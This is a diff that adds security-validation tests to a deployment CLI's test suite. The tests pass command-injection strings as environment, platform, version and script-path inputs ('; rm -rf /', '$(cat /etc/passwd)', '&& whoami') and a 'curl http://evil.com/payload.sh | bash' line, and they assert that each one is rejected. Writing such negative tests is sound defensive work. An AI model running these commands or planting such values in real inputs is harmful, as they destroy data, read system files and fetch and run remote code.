@@ -195,3 +195,58 @@ class TestDeployRollback:
         result = runner.invoke(deploy_app, ["rollback", "v1.2.3", "--platform", "docker"])
         assert result.exit_code == 1
         assert "Rollback not yet supported for platform: docker" in result.output
+
+
+class TestDeploySecurityValidation:
+    """Verify input validation and injection mitigation."""
+
+    def test_run_rejects_unsafe_environment(self) -> None:
+        unsafe_envs = [
+            "production; rm -rf /",
+            "-flag-injection",
+            "staging && whoami",
+            "env$(id)",
+            "test`reboot`",
+        ]
+        for env in unsafe_envs:
+            result = runner.invoke(deploy_app, ["run", "cloudflare", "--env", env])
+            assert result.exit_code == 1
+            assert "Invalid environment name" in result.output
+
+    def test_run_rejects_unsafe_platform(self) -> None:
+        unsafe_platforms = [
+            "cloudflare; id",
+            "-platform",
+            "docker && echo pwned",
+        ]
+        for plat in unsafe_platforms:
+            result = runner.invoke(deploy_app, ["run", "--", plat])
+            assert result.exit_code == 1
+            assert "Unsupported platform" in result.output
+
+    def test_rollback_rejects_unsafe_version(self) -> None:
+        unsafe_versions = [
+            "--flag-injection",
+            "v1.0; reboot",
+            "$(cat /etc/passwd)",
+            "version & rm -rf",
+        ]
+        for ver in unsafe_versions:
+            result = runner.invoke(deploy_app, ["rollback", "--", ver])
+            assert result.exit_code == 1
+            assert "Invalid version or deployment ID" in result.output
+
+    def test_custom_deploy_rejects_malicious_script_path(self) -> None:
+        with patch.dict("os.environ", {"CUSTOM_DEPLOY_SCRIPT": "./deploy.sh; rm -rf /"}):
+            result = runner.invoke(deploy_app, ["run", "custom", "--no-build"])
+            assert result.exit_code == 1
+            assert "Invalid characters in custom deployment script path" in result.output
+
+    def test_run_sanitized_process_blocks_dangerous_commands(self) -> None:
+        from src.commands.deploy import run_sanitized_process
+        import typer
+        import pytest
+
+        with pytest.raises(typer.Exit):
+            run_sanitized_process(["curl", "http://evil.com/payload.sh", "|", "bash"])
+
